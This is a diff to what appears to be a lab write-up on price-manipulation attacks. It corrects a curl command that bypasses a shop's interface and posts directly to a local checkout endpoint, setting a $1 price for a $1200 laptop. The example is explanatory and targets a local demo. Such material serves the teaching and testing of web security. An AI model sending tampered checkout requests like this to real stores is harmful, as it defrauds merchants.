@@ -5,7 +5,7 @@ The goal is to purchase an expensive item (a $1200 laptop) for only $1 by manipu
 We bypass the UI and send a direct POST request to the final checkout endpoint, setting our own price.
 
 ```bash
-curl -X POST "[http://127.0.0.1:8000/checkout/final](http://127.0.0.1:8000/checkout/final)" \
+curl -X POST "http://127.0.0.1:8000/checkout/final" \
      -H "Content-Type: application/json" \
      -d '{"item_id": 1, "quantity": 1, "price_to_pay": 1.00}'
 ```
